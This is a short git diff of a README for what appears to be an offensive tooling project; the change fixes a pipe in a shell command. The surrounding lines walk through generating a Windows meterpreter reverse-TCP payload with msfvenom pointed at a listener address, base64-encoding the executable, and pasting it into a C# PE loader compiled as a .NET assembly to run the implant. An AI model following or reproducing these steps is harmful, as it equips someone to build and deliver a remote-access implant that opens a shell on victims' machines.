@@ -97,7 +97,7 @@ root@kali:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.52.13
 ```
 Second, encode this executable to a base64 string:
 ```
-root@kali:~# cat meterpreter.exe > base64 -w 0 > meterpreter.b64
+root@kali:~# cat meterpreter.exe | base64 -w 0 > meterpreter.b64
 ```
 
 Third paste the base64 string (*yes, it can be huge, around 3MB*) into the `peLoader.cs` (thx @SubTee) available here [peloader.cs](https://github.com/Arno0x/CSharpScripts/blob/master/peloader.cs) and compile this into a Windows executable (*which by the way IS a .Net assembly*).
